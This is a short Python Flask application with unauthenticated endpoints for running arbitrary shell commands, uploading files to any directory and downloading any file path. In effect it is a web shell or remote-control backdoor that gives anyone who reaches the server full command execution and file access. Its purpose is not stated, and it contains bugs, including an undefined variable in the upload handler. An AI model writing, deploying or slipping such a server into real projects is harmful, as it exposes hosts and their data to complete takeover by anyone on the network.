#coding:utf-8

from flask import Flask,request,Response
import subprocess
import sys
import os

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello World\n'

@app.route('/run',methods=['POST', 'GET'])
def run():
    try:
        if request.method == 'GET':
            cmd = request.args.get("cmd",type= str)
            print cmd
            process = subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            process.wait()
            result = process.stdout.readlines()
            error = process.stderr.readlines()
            return_result = ""
            return_error = ""
            if result:
                for item in result:
                    return_result += item
                return return_result+"\n"
            else:
                for item in error:
                    return_error += item
                return return_error+"\n"
    except Exception as e:
        return str(e)
    return cmd

@app.route('/upload',methods=['POST', 'GET'])
def upload():
    if request.method == 'POST':
        try:
            dest_dir = request.form.get("dest_dir")
            print dest_dir
            if not os.path.isdir(dest_dir):
                os.makedirs(file_dir)   
            f = request.files.get("file")
            print f.filename
            basepath  = os.path.dirname(__file__)
            print(basepath)
            filename = os.path.join(basepath, dest_dir, f.filename)
            f.save(filename)
            return "<{}> upload success\n".format(filename)
        except Exception as e:
            return str(e)
    else:
        return "<{}> upload fail\n".format(filename)

@app.route('/download',methods=['POST', 'GET'])
def download():
    try:
        if request.method == 'GET':
            fullfilename = request.args.get('file')
            print fullfilename
            fullfilenamelist = fullfilename.split('/')
            filename = fullfilenamelist[-1]
            filepath = fullfilename.replace('/%s'%filename, '')
            def send_file():
                store_path = fullfilename
                with open(store_path, 'rb') as targetfile:
                    while True:
                        data = targetfile.read(20 * 1024 * 1024)   
                        if not data:
                            break
                        yield data
    except Exception as e:
        return str(e)
    response = Response(send_file(), content_type='application/octet-stream')
    response.headers["Content-disposition"] = 'attachment; filename=%s' % filename 
    return response